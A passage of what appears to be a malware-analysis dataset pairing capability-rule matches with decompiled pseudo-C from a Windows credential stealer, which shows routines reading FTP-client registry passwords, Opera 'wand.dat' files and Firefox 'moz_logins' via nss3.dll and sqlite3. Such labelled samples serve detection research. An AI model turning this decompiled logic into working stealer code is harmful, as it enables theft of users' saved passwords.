 fcn.00401569(arg_8h, 0);\n                }\n                else {\n                    fcn.00401569(arg_8h, *var_82ch);\n                }\n            }\n            fcn.004018b8(var_81ch);\n            fcn.004018b8(var_814h);\n            fcn.004018b8(var_818h);\n            fcn.004018b8(var_824h);\n            fcn.004018b8(var_82ch);\n            fcn.00407bba(arg_8h, arg_ch, var_810h);\n            fcn.004018b8(var_810h);\n            var_8h = var_8h + 1;\n        }\n        fcn.004107c0(var_4h);\n    }\n    return;\n}\n",
        "token_count": 962
    },
    "00407f0c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407f0c(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint var_82ch;\n    uint var_828h;\n    uint var_824h;\n    uint var_820h;\n    int32_t var_81ch;\n    int32_t var_818h;\n    int32_t var_814h;\n    uint var_810h;\n    uint var_80ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004107c6(arg_ch, arg_10h, &var_4h);\n    if (iVar1 == 0) {\n        var_8h = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = fcn.004107cc(var_4h, var_8h, &var_80ch, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            uVar2 = fcn.00401df8(arg_10h, 0x414845);\n            var_810h = fcn.00401df8(uVar2, &var_80ch);\n            fcn.004018b8(uVar2);\n            var_81ch = fcn.00401d71(arg_ch, var_810h, \"PassWord\", &var_820h);\n            var_814h = fcn.00401d71(arg_ch, var_810h, 0x415c86, 0);\n            var_818h = fcn.00401d71(arg_ch, var_810h, 0x415c8a, 0);\n            uVar2 = fcn.00401d71(arg_ch, var_810h, \"RootDirectory\", 0);\n            arg_ch_00 = fcn.00401d71(arg_ch, var_810h, 0x415ca1, 0);\n            arg_ch_01 = fcn.00401d71(arg_ch, var_810h, 0x415cdd, 0);\n            if (((var_81ch != 0) && (var_814h != 0)) && (var_818h != 0)) {\n                fcn.00401569(arg_8h, 0xbeef0010);\n                fcn.004015cb(arg_8h, var_814h);\n                fcn.004015cb(arg_8h, var_818h);\n                fcn.0040159f(arg_8h, var_81ch, var_820h);\n                fcn.004015cb(arg_8h, arg_ch_00);\n                fcn.004015cb(arg_8h, uVar2);\n                fcn.004015cb(arg_8h, arg_ch_01);\n            }\n            fcn.004018b8(var_81ch);\n            fcn.004018b8(var_814h);\n            fcn.004018b8(var_818h);\n            fcn.004018b8(uVar2);\n            fcn.004018b8(arg_ch_00);\n            fcn.004018b8(arg_ch_01);\n            fcn.00407f0c(arg_8h, arg_ch, var_810h);\n            fcn.004018b8(var_810h);\n            var_8h = var_8h + 1;\n        }\n        fcn.004107c0(var_4h);\n    }\n    return;\n}\n",
        "token_count": 808
    },
    "0040816d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040816d(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    uint uVar2;\n    int32_t iVar3;\n    uint arg_ch_00;\n    char *arg_8h_00;\n    char *pcVar4;\n    char *pcVar5;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x20, 0);\n    cVar1 = **0x4147f1;\n    arg_8h_00 = *0x4147ed;\n    pcVar5 = *0x4147f1;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.00401636(arg_8h, arg_ch);\n            return;\n        }\n        uVar2 = fcn.00410808(arg_8h_00, \"FTPCON\");\n        pcVar4 = pcVar5;\n        iVar3 = fcn.00410808(pcVar5, \"FTP CONTROL\", uVar2);\n        if ((iVar3 != 0) || (pcVar4 != NULL)) {\n            uVar2 = fcn.0040242b(arg_8h_00);\n            arg_ch_00 = fcn.00401e4c(uVar2, \"\\\\Profiles\");\n            uVar2 = arg_8h;\n            fcn.00404351(arg_8h, arg_ch_00, \".prf\", 0xbeef0000);\n            fcn.004018b8(uVar2);\n        }\n        for (; *arg_8h_00 != '\\0'; arg_8h_00 = arg_8h_00 + 1) {\n        }\n        arg_8h_00 = arg_8h_00 + 1;\n        iVar3 = -1;\n        pcVar4 = pcVar5;\n        do {\n            pcVar5 = pcVar4;\n            if (iVar3 == 0) break;\n            iVar3 = iVar3 + -1;\n            pcVar5 = pcVar4 + 1;\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar5;\n        } while (cVar1 != '\\0');\n        cVar1 = *pcVar5;\n    } while( true );\n}\n",
        "token_count": 504
    },
    "00408207": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00408207(uint arg_8h, int32_t *arg_ch, uint *arg_10h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint arg_ch_00;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00401364(arg_8h, arg_ch);\n    iVar1 = fcn.004010c2(arg_8h, arg_8h_00);\n    if ((iVar1 == 0) || (*arg_ch == 0)) {\n        arg_8h = 0;\n    }\n    else {\n        arg_ch_00 = fcn.004018cf(arg_8h_00);\n        fcn.0040133e(arg_8h, arg_ch_00, arg_8h_00, arg_ch);\n        if (*arg_ch == 0) {\n            fcn.004018b8(arg_8h);\n            arg_8h = 0;\n        }\n        else if (arg_10h != NULL) {\n            *arg_10h = arg_8h_00;\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 258
    },
    "00408293": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00408293(uchar *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint arg_8h_00;\n    uchar *puVar5;\n    uchar *puVar6;\n    uint *puVar7;\n    uint32_t uVar8;\n    uint *puVar9;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_20h;\n    uint var_18h;\n    uint var_10h;\n    \n    if ((((arg_8h == NULL) || (arg_ch == 0)) || (arg_10h == 0)) || (arg_14h == 0)) {\n        return 0;\n    }\n    if ((arg_ch == 0) || ((arg_ch & 7) != 0)) {\n        return 0;\n    }\n    if ((arg_14h != 0) && ((arg_14h & 7) == 0)) {\n        arg_8h_00 = 0;\n        puVar1 = fcn.004018cf(arg_ch + 0xb);\n        puVar5 = 0x415d0a;\n        puVar2 = puVar1;\n        for (iVar3 = 0xb; uVar8 = arg_ch,  puVar6 = arg_8h,  iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar2 = *puVar5;\n            puVar5 = puVar5 + 1;\n            puVar2 = puVar2 + 1;\n        }\n        for (; uVar8 != 0; uVar8 = uVar8 - 1) {\n            *puVar2 = *puVar6;\n            puVar6 = puVar6 + 1;\n            puVar2 = puVar2 + 1;\n        }\n        fcn.00402497(puVar1, arg_ch + 0xb, &var_10h);\n        fcn.004018b8(puVar1);\n        iVar3 = arg_ch + 0x1b;\n        puVar2 = fcn.004018cf(iVar3);\n        puVar7 = &var_10h;\n        puVar5 = puVar2;\n        for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar5 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar5 = puVar5 + 1;\n        }\n        puVar1 = 0x415d0a;\n        for (iVar4 = 0xb; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar5 = *puVar1;\n            puVar1 = puVar1 + 1;\n            puVar5 = puVar5 + 1;\n        }\n        for (; arg_ch != 0; arg_ch = arg_ch - 1) {\n            *puVar5 = *arg_8h;\n            arg_8h = arg_8h + 1;\n            puVar5 = puVar5 + 1;\n        }\n        fcn.00402497(puVar2, iVar3, &var_20h);\n        fcn.004018b8(puVar2);\n        puVar7 = &var_10h;\n        puVar9 = &var_38h;\n        for (iVar3 = 0x10; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar9 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar9 = puVar9 + 1;\n        }\n        puVar7 = &var_20h;\n        for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar9 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar9 = puVar9 + 1;\n        }\n        fcn.0041274b(&var_38h, 1);\n        arg_14h = arg_14h >> 3;\n        iVar3 = arg_10h;\n        if (arg_14h != 0) {\n            for (; arg_14h != 0; arg_14h = arg_14h - 1) {\n                fcn.004129f6(iVar3, iVar3, &var_18h);\n                iVar3 = iVar3 + 8;\n            }\n            if (*(iVar3 + -1) < 9) {\n                iVar3 = iVar3 - *(iVar3 + -1);\n            }\n            uVar8 = iVar3 - arg_10h >> 1;\n            iVar3 = fcn.004106e2(0, 0, arg_10h, uVar8, 0, 0, 0, 0);\n            if (iVar3 != 0) {\n                iVar4 = iVar3;\n                arg_8h_00 = fcn.004018cf(iVar3);\n                iVar3 = fcn.004106e2(0, 0, arg_10h, uVar8, arg_8h_00, iVar3, 0, 0, iVar4);\n                if (iVar3 == 0) {\n                    fcn.004018b8(arg_8h_00);\n                    arg_8h_00 = 0;\n                }\n            }\n        }\n        return arg_8h_00;\n    }\n    return 0;\n}\n",
        "token_count": 1260
    },
    "004084a7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004084a7(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    \n    if (5 < arg_ch) {\n        fcn.00401364(arg_8h, arg_10h);\n        fcn.00408275(arg_8h, arg_10h);\n        fcn.00408275(arg_8h, arg_10h);\n    }\n    uVar1 = fcn.00408426(arg_8h, arg_10h);\n    *arg_14h = uVar1;\n    fcn.00408275(arg_8h, arg_10h);\n    if (3 < arg_ch) {\n        fcn.00408275(arg_8h, arg_10h);\n        fcn.00408275(arg_8h, arg_10h);\n    }\n    fcn.004013e8(arg_8h, 0x18, arg_10h);\n    fcn.00401364(arg_8h, arg_10h);\n    return;\n}\n",
        "token_count": 244
    },
    "00408568": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408568(uint arg_8h, uint arg_ch, uint arg_10h, int32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    fcn.004013e8(arg_8h, 1, arg_14h);\n    iVar1 = fcn.00401364(arg_8h, arg_14h);\n    while ((iVar1 != 0 && (*arg_14h != 0))) {\n        var_4h = 0;\n        iVar2 = fcn.004084a7(arg_8h, arg_10h, arg_14h, &var_4h);\n        if (var_4h == 0) {\n            var_14h = 0;\n        }\n        else {\n            var_14h = fcn.00410808(var_4h, 0x415d15);\n            if (var_14h == 0) {\n                var_14h = fcn.00410808(var_4h, 0x415d1d);\n            }\n        }\n        if (var_14h != 0) {\n            fcn.00401569(arg_ch, 0xbeef0001);\n            fcn.004015cb(arg_ch, var_4h);\n        }\n        while ((iVar2 != 0 && (*arg_14h != 0))) {\n            var_8h = 0;\n            var_ch = 0;\n            var_10h = 0;\n            fcn.00408524(arg_8h, arg_14h, &var_8h, &var_ch, &var_10h);\n            if (((var_14h != 0) && (var_8h != 0)) && ((var_ch != 0 || (var_10h != 0)))) {\n                fcn.004015cb(arg_ch, var_8h);\n                fcn.004015cb(arg_ch, var_ch);\n                fcn.004015cb(arg_ch, var_10h);\n            }\n            fcn.004018b8(var_8h);\n            fcn.004018b8(var_ch);\n            fcn.004018b8(var_10h);\n            iVar2 = iVar2 + -1;\n        }\n        if (var_14h != 0) {\n            fcn.00401569(arg_ch, 0);\n            fcn.00401569(arg_ch, 0);\n            fcn.00401569(arg_ch, 0);\n        }\n        fcn.004018b8(var_4h);\n        iVar1 = iVar1 + -1;\n    }\n    return;\n}\n",
        "token_count": 624
    },
    "004086d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004086d8(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t arg_ch_00;\n    int32_t arg_ch_01;\n    int32_t arg_ch_02;\n    int32_t iVar4;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    uVar1 = fcn.00401082(arg_8h);\n    if (uVar1 < 0x10) {\n        return 1;\n    }\n    fcn.004012bb(arg_8h);\n    var_8h = 1;\n    var_4h = fcn.00401364(arg_8h, &var_8h);\n    if (((var_8h == 0) || (var_4h < 2)) || (6 < var_4h)) {\n        return 1;\n    }\n    iVar2 = fcn.00401364(arg_8h, &var_8h);\n    if ((var_8h == 0) || (iVar2 != 0)) {\n        return 1;\n    }\n    if (var_4h < 5) {\n        var_1ch = fcn.00401364(arg_8h, &var_8h);\n        fcn.004013e8(arg_8h, 4, &var_8h);\n    }\n    else {\n        fcn.004013e8(arg_8h, 0x18, &var_8h);\n        var_1ch = fcn.00401364(arg_8h, &var_8h);\n    }\n    fcn.00408275(arg_8h, &var_8h);\n    if (var_1ch == 1) {\n        fcn.00408568(arg_8h, arg_ch, var_4h, &var_8h);\n        fcn.00408275(arg_8h, &var_8h);\n    }\n    if (var_8h != 0) {\n        fcn.00408568(arg_8h, arg_ch, var_4h, &var_8h);\n        if (var_8h != 0) {\n            iVar2 = fcn.00401364(arg_8h, &var_8h);\n            while (((var_8h != 0 && (iVar2 != 0)) && (uVar3 = fcn.00401522(arg_8h),  uVar3 != uVar1))) {\n                if (5 < var_4h) {\n                    fcn.00401364(arg_8h, &var_8h);\n                    fcn.00408275(arg_8h, &var_8h);\n                    fcn.00408275(arg_8h, &var_8h);\n                }\n                arg_ch_00 = fcn.00408426(arg_8h, &var_8h);\n                arg_ch_01 = fcn.00408426(arg_8h, &var_8h);\n                arg_ch_02 = fcn.00408426(arg_8h, &var_8h);\n                if ((((arg_ch_00 != 0) && (arg_ch_01 != 0)) && (arg_ch_02 != 0)) && (var_8h != 0)) {\n                    iVar4 = fcn.00410808(arg_ch_00, 0x415d26);\n                    if ((iVar4 == 0) && (iVar4 = fcn.00410808(arg_ch_00, 0x415d15),  iVar4 == 0)) {\n                        iVar4 = fcn.00410808(arg_ch_00, 0x415d1d);\n                    }\n                    if (iVar4 != 0) {\n                        fcn.00401569(arg_ch, 0xbeef0000);\n                        fcn.004015cb(arg_ch, arg_ch_00);\n                        fcn.004015cb(arg_ch, arg_ch_01);\n                        fcn.004015cb(arg_ch, arg_ch_02);\n                    }\n                }\n                fcn.004018b8(arg_ch_00);\n                fcn.004018b8(arg_ch_01);\n                fcn.004018b8(arg_ch_02);\n                iVar2 = iVar2 + -1;\n            }\n            return var_8h;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 1018
    },
    "00408961": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408961(uchar *arg_8h, char *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uchar *arg_8h_00;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint32_t var_13eh;\n    uchar auStack278 [274];\n    \n    var_148h = 0;\n    if ((arg_ch != NULL) && (*arg_ch != '\\0')) {\n        iVar1 = fcn.004025a9(arg_ch);\n        if (iVar1 == 0) {\n            var_148h = fcn.00401df8(arg_ch, \"\\\\*.*\");\n        }\n        else {\n            var_148h = fcn.00401df8(arg_ch, 0x414f8e);\n        }\n        fcn.004018e6(&var_13eh, 0x13e);\n        iVar1 = fcn.0041070c(var_148h, &var_13eh);\n        if (iVar1 != -1) {\n            do {\n                if ((var_13eh & 0x10) == 0) {\n                    arg_8h_00 = auStack278;\n                    iVar2 = fcn.00410808();\n                    if (iVar2 != 0) {\n                        uVar3 = fcn.00401df8(arg_ch, 0x414845);\n                        uVar3 = fcn.00401e4c(uVar3, auStack278);\n                        arg_8h_00 = arg_8h;\n                        fcn.0040891c(arg_8h, uVar3);\n                        fcn.004018b8(arg_8h_00);\n                    }\n                }\n                else {\n                    arg_8h_00 = 0x414f84;\n                    iVar2 = fcn.00410712();\n                    if (iVar2 != 0) {\n                        arg_8h_00 = 0x414f86;\n                        iVar2 = fcn.00410712();\n                        if (iVar2 != 0) {\n                            iVar2 = fcn.004025a9(arg_ch);\n                            if (iVar2 == 0) {\n                                uVar3 = fcn.00401df8(arg_ch, 0x414845);\n                            }\n                            else {\n                                uVar3 = fcn.00401df8(arg_ch, 0);\n                            }\n                            uVar3 = fcn.00401e4c(uVar3, auStack278);\n                            arg_8h_00 = arg_8h;\n                            fcn.00408961(arg_8h, uVar3, arg_10h);\n                            fcn.004018b8(arg_8h_00);\n                        }\n                    }\n                }\n                iVar2 = fcn.00410718(iVar1, &var_13eh, arg_8h_00);\n            } while (iVar2 != 0);\n            fcn.0041071e(iVar1);\n        }\n    }\n    fcn.004018b8(var_148h);\n    return;\n}\n",
        "token_count": 688
    },
    "00408ae5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408ae5(uint arg_8h, char *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint arg_ch_00;\n    uint uVar3;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint32_t var_13eh;\n    uchar auStack278 [274];\n    \n    var_148h = 0;\n    if ((arg_ch != NULL) && (*arg_ch != '\\0')) {\n        var_148h = fcn.00401df8(arg_ch, \"\\\\*.*\");\n        uVar3 = 0x13e;\n        fcn.004018e6(&var_13eh, 0x13e);\n        iVar1 = fcn.0041070c(var_148h, &var_13eh);\n        if (iVar1 != -1) {\n            do {\n                if ((var_13eh & 0x10) != 0) {\n                    uVar3 = 0x414f84;\n                    iVar2 = fcn.00410712();\n                    if (iVar2 != 0) {\n                        uVar3 = 0x414f86;\n                        iVar2 = fcn.00410712();\n                        if (iVar2 != 0) {\n                            uVar3 = fcn.00401df8(arg_ch, 0x414845);\n                            arg_ch_00 = fcn.00401e4c(uVar3, auStack278);\n                            uVar3 = arg_ch_00;\n                            iVar2 = fcn.00410808();\n                            if (iVar2 != 0) {\n                                uVar3 = arg_8h;\n                                fcn.00408961(arg_8h, arg_ch_00, \"wand.dat\");\n                            }\n                            fcn.004018b8(uVar3);\n                        }\n                    }\n                }\n                iVar2 = fcn.00410718(iVar1, &var_13eh, uVar3);\n            } while (iVar2 != 0);\n            fcn.0041071e(iVar1);\n        }\n    }\n    fcn.004018b8(var_148h);\n    return;\n}\n",
        "token_count": 484
    },
    "00408d1e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408d1e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    uint var_814h;\n    uint var_810h;\n    uint var_80ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004107c6(arg_ch, arg_10h, &var_4h);\n    if (iVar1 == 0) {\n        var_8h = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = fcn.004107cc(var_4h, var_8h, &var_80ch, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            arg_8h_00 = fcn.00401df8(arg_10h, 0x414845);\n            arg_ch_00 = fcn.00401df8(arg_8h_00, &var_80ch);\n            fcn.004018b8(arg_8h_00);\n            iVar1 = fcn.00401d71(arg_ch, arg_ch_00, 0x415dbd, 0);\n            if (iVar1 != 0) {\n                fcn.00404043(arg_8h, iVar1, 0xbeef0001);\n            }\n            fcn.004018b8(iVar1);\n            fcn.00408d1e(arg_8h, arg_ch, arg_ch_00);\n            fcn.004018b8(arg_ch_00);\n            var_8h = var_8h + 1;\n        }\n        fcn.004107c0(var_4h);\n    }\n    return;\n}\n",
        "token_count": 420
    },
    "00409061": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00409061(int32_t arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint uVar4;\n    \n    *0x416034 = 0;\n    uVar4 = 0;\n    uVar1 = fcn.0041066a(arg_8h);\n    if ((2 < uVar1) && (piVar3 = arg_8h + uVar1 + -2,  *piVar3 == 0x5c5c)) {\n        *piVar3 = 0x5c;\n    }\n    fcn.00410748(arg_ch);\n    iVar2 = fcn.004024d6(\"nss3.dll\", 0x415f19);\n    if (iVar2 != 0) {\n        iVar2 = (**0x415f19)(arg_8h);\n        if (iVar2 == 0) {\n            *0x416034 = (**0x415f29)();\n            if (*0x416034 == 0) {\n                (**0x415f1d)();\n            }\n            else {\n                iVar2 = (**0x415f2d)(*0x416034, 1, 0);\n                if (iVar2 == 0) {\n                    uVar4 = 1;\n                }\n                else {\n                    (**0x415f35)(*0x416034);\n                    (**0x415f1d)();\n                    *0x416034 = 0;\n                }\n            }\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 348
    },
    "00409119": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00409119(void)\n\n{\n    if (*0x416034 != 0) {\n        (**0x415f35)(*0x416034);\n        (**0x415f1d)();\n        *0x416034 = 0;\n    }\n    return;\n}\n",
        "token_count": 61
    },
    "00409142": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00409142(char *arg_8h, int32_t arg_ch)\n\n{\n    uint arg_10h;\n    int32_t iVar1;\n    char *arg_ch_00;\n    uint var_10h;\n    int32_t iStack16;\n    int32_t iStack12;\n    int32_t var_4h;\n    \n    if (((arg_8h != NULL) && (arg_ch != 0)) && (*arg_8h != '\\0')) {\n        if ((*arg_8h != '~') && (*0x416034 == 0)) {\n            return NULL;\n        }\n        if (*arg_8h == '~') {\n            if (((arg_ch - 1U & 3) == 0) && (arg_ch != 1)) {\n                arg_10h = fcn.004018cf((arg_ch + 0x3ff) * 4);\n                arg_8h = arg_8h + 1;\n                fcn.00402699(arg_8h, arg_ch + -1, arg_10h);\n            }\n            else {\n                arg_8h = NULL;\n            }\n            return arg_8h;\n        }\n        arg_ch_00 = NULL;\n        var_4h = (**0x415f21)(0, 0, arg_8h, arg_ch);\n        if (var_4h != 0) {\n            fcn.004018e6(&var_10h, 0xc);\n            iVar1 = (**0x415f31)(var_4h, &var_10h, 0);\n            if (iVar1 == 0) {\n                if (iStack16 != 0) {\n                    arg_ch_00 = fcn.004018cf(iStack12 + 1);\n                    fcn.00401906(iStack16, arg_ch_00, iStack12);\n                }\n                (**0x415f25)(&var_10h, 0);\n            }\n            (**0x415f25)(var_4h, 1);\n        }\n        return arg_ch_00;\n    }\n    return NULL;\n}\n",
        "token_count": 462
    },
    "0040926b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040926b(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    char *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00401f36(arg_ch);\n    if (iVar1 == 0) {\n        return;\n    }\n    iVar1 = fcn.0040413f(arg_ch);\n    if (iVar1 == 0) {\n        iVar1 = fcn.00409061(arg_10h, arg_14h);\n        if (iVar1 != 0) {\n            iVar1 = fcn.004024d6(\"mozsqlite3.dll\", 0x416018);\n            if (iVar1 == 0) {\n                iVar1 = fcn.004024d6(\"sqlite3.dll\", 0x416018);\n            }\n            if ((iVar1 != 0) && (iVar1 = (**0x416018)(arg_ch, &var_4h),  iVar1 == 0)) {\n                iVar1 = (**0x416020)(var_4h, \"SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins\", \n                                     0xffffffff, &var_8h, 0);\n                if (iVar1 == 0) {\n                    while (iVar1 = (**0x416024)(var_8h),  iVar1 == 100) {\n                        pcVar2 = fcn.0040923f(var_8h, 0, &var_ch);\n                        if (((pcVar2 != NULL) && (var_ch != 0)) && (*pcVar2 != '\\0')) {\n                            iVar4 = var_ch + 1;\n                            iVar1 = fcn.004018cf(iVar4);\n                            iVar4 = fcn.00401906(iVar4, iVar1, var_ch);\n                            var_10h = 0;\n                            var_14h = 0;\n                            if (*0x416030 == 0) {\n                                uVar3 = fcn.0041066a(0x416126);\n                                iVar4 = fcn.00410820(iVar1, 0x416126, uVar3);\n                                if (iVar4 != 0) {\n                                    uVar3 = fcn.0041066a(\"http://\");\n                                    iVar4 = fcn.00410820(iVar1, \"http://\", uVar3);\n                                }\n                                if (iVar4 != 0) {\n                                    fcn.0041066a(\"https://\");\n                                    iVar4 = fcn.00410820();\n                                }\n                            }\n                            else if (*0x416030 == 1) {\n                                uVar3 = fcn.0041066a(\"ftp.\");\n                                iVar4 = fcn.00410820(iVar1, \"ftp.\", uVar3);\n                            }\n                            else if (*0x416030 == 2) {\n                                iVar4 = 0;\n                            }\n                            if (iVar4 == 0) {\n                                uVar3 = fcn.0040923f(var_8h, 1, &var_ch);\n                                var_10h = fcn.00409142(uVar3, var_ch);\n                                uVar3 = fcn.0040923f(var_8h, 2, &var_ch);\n                                var_14h = fcn.00409142(uVar3, var_ch);\n                                if ((iVar1 != 0) && (var_14h != 0)) {\n                                    fcn.00401569(arg_8h, 0xbeef0000);\n                                    fcn.004015cb(arg_8h, iVar1);\n                                    fcn.004015cb(arg_8h, var_10h);\n                                    fcn.004015cb(arg_8h, var_14h);\n                                }\n                            }\n                            fcn.004018b8(var_10h);\n                            fcn.004018b8(var_14h);\n                            fcn.004018b8(iVar1);\n                        }\n                    }\n                }\n                (**0x41601c)(var_4h);\n            }\n            fcn.00409119();\n            return;\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 958
    },
    "004094d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
